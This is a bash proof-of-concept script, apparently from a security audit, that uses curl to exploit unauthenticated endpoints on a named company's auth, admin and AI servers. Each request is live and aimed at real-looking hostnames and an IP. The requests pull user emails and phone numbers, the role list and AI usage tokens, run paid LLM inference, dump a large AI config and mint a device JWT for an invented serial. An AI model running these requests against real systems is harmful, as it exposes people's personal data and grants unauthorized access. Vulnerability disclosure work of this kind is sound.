#!/usr/bin/env bash
# EK-02/06/12/21/24: Surface sans aucune authentification (2 minutes, 0 credential)
# Usage: ./poc_01_unauth.sh
set -u
AUTH="http://auth.energizelab.com.cn:9080"
ADMIN="http://45.32.81.33:9090"
AI="http://ai.energizelab.com.cn:8000"

echo "== [EK-12] Unauthenticated PII: emails/phones in comment/list =="
curl -s "$AUTH/api/comment/list?page_num=1&page_size=5" | head -c 400; echo; echo

echo "== [EK-21] Swagger publics =="
curl -s -o /dev/null -w "auth /docs-json        → %{http_code}\n" "$AUTH/docs-json"
curl -s -o /dev/null -w "admin swagger-ui-init  → %{http_code}\n" "$ADMIN/docs/swagger-ui-init.js"
curl -s -o /dev/null -w "ai /openapi.json       → %{http_code}\n" "$AI/openapi.json"; echo

echo "== [EK-24] RBAC + stats de consommation IA sans auth =="
curl -s "$ADMIN/api/system/role/list" | head -c 300; echo
curl -s "$ADMIN/api/chat-data/token"; echo; echo

echo "== [EK-02] Unauthenticated LLM inference (1 call, qwen at Energizelab's expense) =="
curl -s -X POST "$AI/ali_inference" -H 'Content-Type: application/json' \
     -d '{"message":"Say AUDIT_POC","sn":"POC0001"}' | head -c 200; echo; echo

echo "== [EK-02] Dump config IA 5 MB sans auth =="
curl -s "$AI/model/get" | wc -c; echo

echo "== [EK-06] JWT device pour un SN fictif, sans auth =="
curl -s -X POST "$AUTH/api/auth/getDeviceToken" -H 'Content-Type: application/json' \
     -d '{"sn":"0000000000000000"}' | head -c 120; echo
